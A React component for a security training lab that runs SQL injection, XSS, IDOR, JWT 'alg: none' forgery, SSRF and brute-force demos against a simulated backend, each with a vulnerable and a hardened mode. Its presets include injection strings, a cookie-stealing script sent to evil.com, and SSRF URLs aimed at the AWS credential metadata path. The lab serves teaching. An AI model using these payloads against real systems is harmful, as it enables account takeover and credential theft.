/**
 * @license
 * SPDX-License-Identifier: Apache-2.0
 */

import React, { useState, useEffect } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Terminal,
  Send,
  Database,
  Code2,
  RefreshCw,
  AlertTriangle,
  Lock,
  Layers,
  Zap,
} from 'lucide-react';
import { controlledLab, LabRequestLog, LabSecurityLevel } from '../../services/controlledLabServer';
import { createJwt, verifyJwt } from '../../services/cryptoEngine';

interface ControlledLabViewProps {
  securityLevel: LabSecurityLevel;
  onToggleSecurityLevel: () => void;
}

export const ControlledLabView: React.FC<ControlledLabViewProps> = ({
  securityLevel,
  onToggleSecurityLevel,
}) => {
  const [activeModule, setActiveModule] = useState<
    'sqli' | 'xss' | 'bola' | 'jwt' | 'ssrf' | 'ratelimit'
  >('sqli');

  // SQLi Form State
  const [sqliMode, setSqliMode] = useState<'login' | 'search'>('login');
  const [loginUser, setLoginUser] = useState("' OR '1'='1' --");
  const [loginPass, setLoginPass] = useState('anything');
  const [searchQuery, setSearchQuery] = useState("' UNION SELECT --");

  // XSS Form State
  const [commentAuthor, setCommentAuthor] = useState('Alice');
  const [commentContent, setCommentContent] = useState(
    "<img src=x onerror=\"alert('XSS: Document Cookie = ' + document.cookie)\">"
  );
  const [commentsList, setCommentsList] = useState(controlledLab.getComments());

  // BOLA Form State
  const [selectedInvoiceId, setSelectedInvoiceId] = useState('inv-999');

  // JWT Form State
  const [jwtPayloadRole, setJwtPayloadRole] = useState<'user' | 'admin'>('user');
  const [jwtTamperAlgNone, setJwtTamperAlgNone] = useState(true);
  const [jwtTokenString, setJwtTokenString] = useState('');
  const [jwtVerifyResult, setJwtVerifyResult] = useState<{
    valid: boolean;
    header: Record<string, unknown>;
    payload: Record<string, unknown>;
    error?: string;
  } | null>(null);

  // SSRF Form State
  const [ssrfUrl, setSsrfUrl] = useState(
    'http://169.254.169.254/latest/meta-data/iam/security-credentials/'
  );

  // Rate Limiting State
  const [burstCount, setBurstCount] = useState(0);
  const [otpCode, setOtpCode] = useState('123456');
  const [isBursting, setIsBursting] = useState(false);

  // Telemetry & Output
  const [latestLog, setLatestLog] = useState<LabRequestLog | null>(null);
  const [allLogs, setAllLogs] = useState<LabRequestLog[]>(controlledLab.getLogs());
  const [isExecuting, setIsExecuting] = useState(false);

  useEffect(() => {
    const unsub = controlledLab.subscribe((logs) => {
      setAllLogs(logs);
      if (logs.length > 0) {
        setLatestLog(logs[0]);
      }
    });
    return unsub;
  }, []);

  // Update JWT token string helper
  useEffect(() => {
    async function updateJwt() {
      const payload = {
        sub: 'usr-2',
        username: 'alice',
        role: jwtPayloadRole,
        exp: Math.floor(Date.now() / 1000) + 3600,
      };
      const token = await createJwt(
        payload,
        'super-secret-key-2026',
        jwtTamperAlgNone ? 'none' : 'HS256'
      );
      setJwtTokenString(token);
    }
    updateJwt();
  }, [jwtPayloadRole, jwtTamperAlgNone]);

  // Handlers for executing lab actions
  const handleExecuteSqli = async () => {
    setIsExecuting(true);
    try {
      if (sqliMode === 'login') {
        await controlledLab.handleLogin(loginUser, loginPass);
      } else {
        await controlledLab.handleProductSearch(searchQuery);
      }
    } finally {
      setIsExecuting(false);
    }
  };

  const handleExecuteXss = async () => {
    setIsExecuting(true);
    try {
      await controlledLab.handleAddComment(commentAuthor, commentContent);
      setCommentsList(controlledLab.getComments());
    } finally {
      setIsExecuting(false);
    }
  };

  const handleExecuteBola = async () => {
    setIsExecuting(true);
    try {
      // Alice requesting invoice
      await controlledLab.handleGetInvoice(selectedInvoiceId, 'usr-2');
    } finally {
      setIsExecuting(false);
    }
  };

  const handleExecuteJwtVerify = async () => {
    setIsExecuting(true);
    try {
      const allowNone = securityLevel === 'VULNERABLE';
      const result = await verifyJwt(jwtTokenString, 'super-secret-key-2026', allowNone);
      setJwtVerifyResult(result);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleExecuteSsrf = async () => {
    setIsExecuting(true);
    try {
      await controlledLab.handleFetchUrl(ssrfUrl);
    } finally {
      setIsExecuting(false);
    }
  };

  const handleExecuteRateLimitBurst = async () => {
    setIsBursting(true);
    setBurstCount(0);
    try {
      for (let i = 1; i <= 6; i++) {
        await controlledLab.handleVerifyOtp('192.168.1.105', otpCode);
        setBurstCount(i);
        await new Promise((r) => setTimeout(r, 120));
      }
    } finally {
      setIsBursting(false);
    }
  };

  return (
    <div className="space-y-6">
      {/* Top Banner: Lab Mode & Ethical Testing Notice */}
      <div
        className={`border rounded-xl p-5 transition-all flex flex-col md:flex-row md:items-center justify-between gap-4 ${
          securityLevel === 'VULNERABLE'
            ? 'bg-red-950/20 border-red-500/30'
            : 'bg-emerald-950/20 border-emerald-500/30'
        }`}
      >
        <div className="space-y-1">
          <div className="flex items-center gap-2">
            {securityLevel === 'VULNERABLE' ? (
              <ShieldAlert className="w-5 h-5 text-red-400" />
            ) : (
              <ShieldCheck className="w-5 h-5 text-emerald-400" />
            )}
            <h1 className="text-lg font-bold text-white">
              Controlled Practice Lab: {securityLevel === 'VULNERABLE' ? 'Level 0 (Vulnerable Mode)' : 'Level 1 (Hardened Defenses Active)'}
            </h1>
          </div>
          <p className="text-xs text-slate-300 max-w-2xl">
            {securityLevel === 'VULNERABLE'
              ? 'Vulnerable Mode intentionally mimics unpatched legacy endpoints (string-concatenated queries, missing auth checks, raw innerHTML) for safe hands-on testing in this isolated sandbox.'
              : 'Hardened Mode activates defensive countermeasures: parameterized SQL bindings, contextual HTML entity sanitization, tenant ownership verification, and sliding-window rate limiting.'}
          </p>
        </div>

        <button
          onClick={onToggleSecurityLevel}
          className={`px-4 py-2 text-xs font-semibold rounded-lg border transition-all cursor-pointer whitespace-nowrap ${
            securityLevel === 'VULNERABLE'
              ? 'bg-red-500 text-slate-950 hover:bg-red-400 border-red-400'
              : 'bg-emerald-500 text-slate-950 hover:bg-emerald-400 border-emerald-400'
          }`}
        >
          Switch to {securityLevel === 'VULNERABLE' ? 'Hardened Mode' : 'Vulnerable Mode'}
        </button>
      </div>

      {/* Lab Modules Navigation Bar */}
      <div className="flex items-center gap-1.5 p-1 bg-[#0d131f] border border-slate-800 rounded-xl overflow-x-auto">
        <button
          onClick={() => setActiveModule('sqli')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'sqli'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Database className="w-3.5 h-3.5 text-amber-400" />
          <span>1. SQL Injection</span>
        </button>

        <button
          onClick={() => setActiveModule('xss')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'xss'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Code2 className="w-3.5 h-3.5 text-emerald-400" />
          <span>2. Stored & Reflected XSS</span>
        </button>

        <button
          onClick={() => setActiveModule('bola')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'bola'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Layers className="w-3.5 h-3.5 text-blue-400" />
          <span>3. BOLA / IDOR</span>
        </button>

        <button
          onClick={() => setActiveModule('jwt')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'jwt'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Lock className="w-3.5 h-3.5 text-purple-400" />
          <span>4. JWT Security & Tampering</span>
        </button>

        <button
          onClick={() => setActiveModule('ssrf')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'ssrf'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <Zap className="w-3.5 h-3.5 text-rose-400" />
          <span>5. SSRF Outbound Fetch</span>
        </button>

        <button
          onClick={() => setActiveModule('ratelimit')}
          className={`px-4 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer whitespace-nowrap flex items-center gap-2 ${
            activeModule === 'ratelimit'
              ? 'bg-slate-800 text-white font-semibold'
              : 'text-slate-400 hover:text-slate-200'
          }`}
        >
          <RefreshCw className="w-3.5 h-3.5 text-cyan-400" />
          <span>6. Rate Limiting & DoS</span>
        </button>
      </div>

      {/* Main Two-Column Layout: Interactive Form on Left, Telemetry & Code on Right */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        {/* Left Column: Interactive Attack & Test Bench (7 cols) */}
        <div className="lg:col-span-7 space-y-5">
          {/* Module 1: SQL Injection */}
          {activeModule === 'sqli' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div className="flex items-center justify-between">
                <div>
                  <h3 className="text-base font-bold text-white flex items-center gap-2">
                    <Database className="w-4 h-4 text-amber-400" />
                    <span>SQL Injection (CWE-89) Sandbox</span>
                  </h3>
                  <p className="text-xs text-slate-400 mt-0.5">
                    Test authentication bypass and UNION data exfiltration against simulated database queries.
                  </p>
                </div>

                <div className="flex items-center gap-1 bg-[#070b12] p-1 rounded-lg border border-slate-800 text-xs">
                  <button
                    onClick={() => setSqliMode('login')}
                    className={`px-2.5 py-1 rounded cursor-pointer ${
                      sqliMode === 'login' ? 'bg-slate-800 text-white font-medium' : 'text-slate-400'
                    }`}
                  >
                    Auth Bypass
                  </button>
                  <button
                    onClick={() => setSqliMode('search')}
                    className={`px-2.5 py-1 rounded cursor-pointer ${
                      sqliMode === 'search' ? 'bg-slate-800 text-white font-medium' : 'text-slate-400'
                    }`}
                  >
                    UNION Leak
                  </button>
                </div>
              </div>

              {sqliMode === 'login' ? (
                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Username / Injection Payload
                    </label>
                    <input
                      type="text"
                      value={loginUser}
                      onChange={(e) => setLoginUser(e.target.value)}
                      className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-amber-300 focus:outline-none focus:border-emerald-500/50"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Password (Can be arbitrary when bypass triggers)
                    </label>
                    <input
                      type="text"
                      value={loginPass}
                      onChange={(e) => setLoginPass(e.target.value)}
                      className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-slate-300 focus:outline-none focus:border-emerald-500/50"
                    />
                  </div>

                  {/* Preset Buttons */}
                  <div className="flex items-center gap-2 flex-wrap text-xs">
                    <span className="text-slate-400 text-[11px]">Presets:</span>
                    <button
                      type="button"
                      onClick={() => setLoginUser("' OR '1'='1' --")}
                      className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                    >
                      ' OR '1'='1' --
                    </button>
                    <button
                      type="button"
                      onClick={() => setLoginUser("admin'--")}
                      className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                    >
                      admin'--
                    </button>
                    <button
                      type="button"
                      onClick={() => setLoginUser('alice')}
                      className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                    >
                      alice (Normal user)
                    </button>
                  </div>
                </div>
              ) : (
                <div className="space-y-3">
                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Catalog Search Query (q)
                    </label>
                    <input
                      type="text"
                      value={searchQuery}
                      onChange={(e) => setSearchQuery(e.target.value)}
                      className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-amber-300 focus:outline-none focus:border-emerald-500/50"
                    />
                  </div>

                  <div className="flex items-center gap-2 flex-wrap text-xs">
                    <span className="text-slate-400 text-[11px]">Presets:</span>
                    <button
                      type="button"
                      onClick={() => setSearchQuery("' UNION SELECT --")}
                      className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                    >
                      ' UNION SELECT --
                    </button>
                    <button
                      type="button"
                      onClick={() => setSearchQuery('Hardware')}
                      className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                    >
                      Hardware (Normal)
                    </button>
                  </div>
                </div>
              )}

              <button
                onClick={handleExecuteSqli}
                disabled={isExecuting}
                className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
              >
                <Send className="w-3.5 h-3.5" />
                <span>Execute SQL Query Simulation</span>
              </button>
            </div>
          )}

          {/* Module 2: XSS */}
          {activeModule === 'xss' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Code2 className="w-4 h-4 text-emerald-400" />
                  <span>Stored & Reflected XSS (CWE-79) Sandbox</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Submit script tags or event handlers to inspect how raw HTML injection is either evaluated or safely disarmed.
                </p>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Author Name
                  </label>
                  <input
                    type="text"
                    value={commentAuthor}
                    onChange={(e) => setCommentAuthor(e.target.value)}
                    className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500/50"
                  />
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Comment Payload (HTML / JS Injection)
                  </label>
                  <textarea
                    rows={3}
                    value={commentContent}
                    onChange={(e) => setCommentContent(e.target.value)}
                    className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-emerald-300 focus:outline-none focus:border-emerald-500/50"
                  />
                </div>

                {/* Presets */}
                <div className="flex items-center gap-2 flex-wrap text-xs">
                  <span className="text-slate-400 text-[11px]">Payloads:</span>
                  <button
                    type="button"
                    onClick={() =>
                      setCommentContent("<img src=x onerror=\"alert('XSS Cookie Theft')\">")
                    }
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    &lt;img onerror=alert()&gt;
                  </button>
                  <button
                    type="button"
                    onClick={() =>
                      setCommentContent("<script>fetch('http://evil.com/?c='+document.cookie)</script>")
                    }
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    &lt;script&gt;Exfil&lt;/script&gt;
                  </button>
                  <button
                    type="button"
                    onClick={() => setCommentContent('Great product, highly recommend for security labs!')}
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    Innocuous Comment
                  </button>
                </div>

                <button
                  onClick={handleExecuteXss}
                  disabled={isExecuting}
                  className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Post Comment to Sandbox Feed</span>
                </button>
              </div>

              {/* Feed Preview */}
              <div className="mt-4 pt-3 border-t border-slate-800 space-y-2">
                <span className="text-xs font-semibold text-slate-400 block">
                  Rendered Stored Comments Feed ({commentsList.length})
                </span>
                <div className="space-y-2 max-h-40 overflow-y-auto pr-1">
                  {commentsList.map((c) => (
                    <div
                      key={c.id}
                      className="bg-[#070b12] p-2.5 rounded-lg border border-slate-800 text-xs"
                    >
                      <div className="flex items-center justify-between text-[11px] text-slate-400 mb-1">
                        <span className="font-semibold text-slate-300">{c.author}</span>
                        <span>{c.date}</span>
                      </div>
                      <div className="text-slate-300 font-mono text-[11px] break-all">
                        {c.content}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            </div>
          )}

          {/* Module 3: BOLA / IDOR */}
          {activeModule === 'bola' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Layers className="w-4 h-4 text-blue-400" />
                  <span>Broken Object Level Authorization (CWE-639 / BOLA)</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Logged in as <strong className="text-white">Alice (usr-2)</strong>. Attempt fetching invoices owned by Alice, Bob, or the Admin Payroll to test tenancy isolation.
                </p>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Target Resource ID (Endpoint: /api/v1/invoices/:id)
                  </label>
                  <select
                    value={selectedInvoiceId}
                    onChange={(e) => setSelectedInvoiceId(e.target.value)}
                    className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500/50"
                  >
                    <option value="inv-101">inv-101 — Owned by Alice ($899 HSM Key Vault)</option>
                    <option value="inv-102">inv-102 — Owned by Bob ($450 Air-Gap Diode)</option>
                    <option value="inv-999">inv-999 — Owned by Admin ($145,000 Confidential Retainer & AWS Root Backup)</option>
                  </select>
                </div>

                <div className="bg-[#070b12] p-3 rounded-lg border border-slate-800 text-xs space-y-1">
                  <span className="text-[11px] text-slate-400 font-mono block">
                    Current Authentication Context:
                  </span>
                  <div className="text-slate-300 font-mono text-[11px]">
                    User: Alice · ID: usr-2 · Role: user · Token: Bearer session_token_for_usr-2
                  </div>
                </div>

                <button
                  onClick={handleExecuteBola}
                  disabled={isExecuting}
                  className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Send GET /api/v1/invoices/{selectedInvoiceId}</span>
                </button>
              </div>
            </div>
          )}

          {/* Module 4: JWT Security */}
          {activeModule === 'jwt' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Lock className="w-4 h-4 text-purple-400" />
                  <span>JWT Token Tampering & 'alg: none' Exploit</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Demonstrates the classic CVE-2015-9235 vulnerability where backends accept unverified tokens with header alg set to "none".
                </p>
              </div>

              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Payload Role Claim
                    </label>
                    <select
                      value={jwtPayloadRole}
                      onChange={(e) => setJwtPayloadRole(e.target.value as 'user' | 'admin')}
                      className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none"
                    >
                      <option value="user">role: "user"</option>
                      <option value="admin">role: "admin" (Privilege Escalation!)</option>
                    </select>
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Header Algorithm
                    </label>
                    <div className="flex items-center gap-2 mt-1">
                      <label className="flex items-center gap-2 text-xs text-slate-300 cursor-pointer">
                        <input
                          type="checkbox"
                          checked={jwtTamperAlgNone}
                          onChange={(e) => setJwtTamperAlgNone(e.target.checked)}
                          className="rounded text-emerald-500 focus:ring-0"
                        />
                        <span>Force alg: "none" (Strip Signature)</span>
                      </label>
                    </div>
                  </div>
                </div>

                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Generated Bearer JWT
                  </label>
                  <textarea
                    rows={2}
                    value={jwtTokenString}
                    onChange={(e) => setJwtTokenString(e.target.value)}
                    className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-purple-300 focus:outline-none"
                  />
                </div>

                <button
                  onClick={handleExecuteJwtVerify}
                  disabled={isExecuting}
                  className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Verify Token Signature at API Gate</span>
                </button>

                {jwtVerifyResult && (
                  <div
                    className={`p-3 rounded-lg border text-xs font-mono ${
                      jwtVerifyResult.valid
                        ? 'bg-amber-950/30 border-amber-500/40 text-amber-300'
                        : 'bg-red-950/30 border-red-500/40 text-red-300'
                    }`}
                  >
                    <div className="font-bold mb-1">
                      {jwtVerifyResult.valid
                        ? 'Token ACCEPTED by API Gateway!'
                        : 'Token REJECTED by API Gateway'}
                    </div>
                    {jwtVerifyResult.error && (
                      <div className="text-[11px] text-red-400">{jwtVerifyResult.error}</div>
                    )}
                    <pre className="text-[10px] mt-1 text-slate-300 overflow-x-auto">
                      {JSON.stringify({ header: jwtVerifyResult.header, payload: jwtVerifyResult.payload }, null, 2)}
                    </pre>
                  </div>
                )}
              </div>
            </div>
          )}

          {/* Module 5: SSRF */}
          {activeModule === 'ssrf' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <Zap className="w-4 h-4 text-rose-400" />
                  <span>Server-Side Request Forgery (CWE-918 / SSRF)</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Test whether the backend's outbound fetch utility validates remote URLs or permits reaching loopback services and AWS metadata (169.254.169.254).
                </p>
              </div>

              <div className="space-y-3">
                <div>
                  <label className="block text-xs font-medium text-slate-300 mb-1">
                    Target URL to Fetch (/api/v1/fetch-url)
                  </label>
                  <input
                    type="text"
                    value={ssrfUrl}
                    onChange={(e) => setSsrfUrl(e.target.value)}
                    className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-rose-300 focus:outline-none focus:border-emerald-500/50"
                  />
                </div>

                <div className="flex items-center gap-2 flex-wrap text-xs">
                  <span className="text-slate-400 text-[11px]">Targets:</span>
                  <button
                    type="button"
                    onClick={() =>
                      setSsrfUrl('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
                    }
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    AWS Cloud Metadata
                  </button>
                  <button
                    type="button"
                    onClick={() => setSsrfUrl('http://127.0.0.1:8080/internal/admin/keys')}
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    127.0.0.1 Loopback
                  </button>
                  <button
                    type="button"
                    onClick={() => setSsrfUrl('https://api.github.com/zen')}
                    className="px-2 py-1 bg-slate-800/80 hover:bg-slate-700 text-slate-300 rounded text-[11px] font-mono cursor-pointer"
                  >
                    Safe Public HTTPS
                  </button>
                </div>

                <button
                  onClick={handleExecuteSsrf}
                  disabled={isExecuting}
                  className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
                >
                  <Send className="w-3.5 h-3.5" />
                  <span>Send Outbound Fetch Request</span>
                </button>
              </div>
            </div>
          )}

          {/* Module 6: Rate Limiting */}
          {activeModule === 'ratelimit' && (
            <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-5 space-y-4">
              <div>
                <h3 className="text-base font-bold text-white flex items-center gap-2">
                  <RefreshCw className="w-4 h-4 text-cyan-400" />
                  <span>Rate Limiting & Brute-Force Throttling (CWE-307)</span>
                </h3>
                <p className="text-xs text-slate-400 mt-0.5">
                  Simulate a credential brute-force script blasting 6 rapid OTP verification requests in succession.
                </p>
              </div>

              <div className="space-y-3">
                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Simulated OTP PIN
                    </label>
                    <input
                      type="text"
                      value={otpCode}
                      onChange={(e) => setOtpCode(e.target.value)}
                      className="w-full bg-[#070b12] border border-slate-800 rounded-lg px-3 py-2 text-xs font-mono text-cyan-300 focus:outline-none"
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-medium text-slate-300 mb-1">
                      Burst Progress
                    </label>
                    <div className="h-9 flex items-center font-mono text-xs text-slate-300 bg-[#070b12] px-3 rounded-lg border border-slate-800 tabular-nums">
                      {isBursting ? `Sending burst ${burstCount}/6...` : 'Idle / Ready'}
                    </div>
                  </div>
                </div>

                <button
                  onClick={handleExecuteRateLimitBurst}
                  disabled={isBursting}
                  className="w-full py-2 bg-emerald-500 hover:bg-emerald-600 text-slate-950 font-semibold text-xs rounded-lg transition-colors flex items-center justify-center gap-1.5 cursor-pointer disabled:bg-slate-800"
                >
                  <RefreshCw className={`w-3.5 h-3.5 ${isBursting ? 'animate-spin' : ''}`} />
                  <span>Launch 6x Rapid Burst Requests</span>
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Right Column: Live Telemetry, SQL Trace & Code Comparison (5 cols) */}
        <div className="lg:col-span-5 space-y-5">
          {/* Latest Execution Log Viewer */}
          <div className="bg-[#070b12] border border-slate-800 rounded-xl p-4 space-y-3">
            <div className="flex items-center justify-between text-xs">
              <span className="font-semibold text-white flex items-center gap-1.5">
                <Terminal className="w-3.5 h-3.5 text-emerald-400" />
                <span>Live Server Telemetry</span>
              </span>
              {latestLog && (
                <span
                  className={`font-mono font-bold text-[11px] px-2 py-0.5 rounded ${
                    latestLog.status < 300
                      ? 'bg-emerald-950/60 text-emerald-400 border border-emerald-800/40'
                      : latestLog.status === 429 || latestLog.status === 403
                      ? 'bg-amber-950/60 text-amber-400 border border-amber-800/40'
                      : 'bg-red-950/60 text-red-400 border border-red-800/40'
                  }`}
                >
                  HTTP {latestLog.status} {latestLog.statusText}
                </span>
              )}
            </div>

            {latestLog ? (
              <div className="space-y-2 text-xs font-mono">
                {latestLog.simulatedQuery && (
                  <div className="bg-[#05080e] p-2.5 rounded border border-slate-900">
                    <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                      Database Query Evaluated:
                    </span>
                    <pre className="text-amber-300 text-[11px] overflow-x-auto whitespace-pre-wrap mt-0.5">
                      {latestLog.simulatedQuery}
                    </pre>
                  </div>
                )}

                {latestLog.defenseNotes && (
                  <div className="bg-[#05080e] p-2.5 rounded border border-slate-900">
                    <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                      Security Engine Analysis:
                    </span>
                    <p className="text-slate-300 text-[11px] mt-0.5">
                      {latestLog.defenseNotes}
                    </p>
                  </div>
                )}

                <div className="bg-[#05080e] p-2.5 rounded border border-slate-900">
                  <span className="text-[10px] text-slate-400 uppercase tracking-wider block">
                    Response Payload:
                  </span>
                  <pre className="text-slate-300 text-[11px] overflow-x-auto max-h-40 whitespace-pre-wrap mt-0.5">
                    {JSON.stringify(latestLog.responseBody, null, 2)}
                  </pre>
                </div>
              </div>
            ) : (
              <div className="text-center py-8 text-xs text-slate-400 font-mono">
                No requests sent yet. Fire an action on the left to inspect server telemetry.
              </div>
            )}
          </div>

          {/* Behind-the-Scenes Architecture & Defense Comparison */}
          <div className="bg-[#0d131f] border border-slate-800 rounded-xl p-4 space-y-2 text-xs">
            <div className="flex items-center gap-2 font-semibold text-white">
              <Code2 className="w-3.5 h-3.5 text-blue-400" />
              <span>Defense Architecture Comparison</span>
            </div>

            <div className="space-y-2 text-slate-300">
              <div className="p-2.5 rounded bg-red-950/20 border border-red-500/20">
                <span className="font-semibold text-red-300 text-[11px] block">
                  Vulnerable Pattern:
                </span>
                <p className="text-[11px] text-slate-300 mt-0.5 font-mono">
                  {activeModule === 'sqli' && 'db.query("SELECT * WHERE u = \'" + user + "\'")'}
                  {activeModule === 'xss' && 'element.innerHTML = req.body.comment'}
                  {activeModule === 'bola' && 'db.invoices.find({ id: req.params.id })'}
                  {activeModule === 'jwt' && 'jwt.verify(token, { algorithms: ["HS256", "none"] })'}
                  {activeModule === 'ssrf' && 'axios.get(req.body.targetUrl)'}
                  {activeModule === 'ratelimit' && 'app.post("/verify-otp", handler)'}
                </p>
              </div>

              <div className="p-2.5 rounded bg-emerald-950/20 border border-emerald-500/20">
                <span className="font-semibold text-emerald-300 text-[11px] block">
                  Hardened Mitigation:
                </span>
                <p className="text-[11px] text-slate-300 mt-0.5 font-mono">
                  {activeModule === 'sqli' && 'db.query("SELECT * WHERE u = $1", [user])'}
                  {activeModule === 'xss' && 'element.textContent = escapeHtml(comment)'}
                  {activeModule === 'bola' && 'db.invoices.find({ id, ownerId: req.user.id })'}
                  {activeModule === 'jwt' && 'jwt.verify(token, secret, { algorithms: ["RS256"] })'}
                  {activeModule === 'ssrf' && 'dnsCheck(url) && ipFilter.isPublic(ip)'}
                  {activeModule === 'ratelimit' && 'app.post("/verify-otp", rateLimiter, handler)'}
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
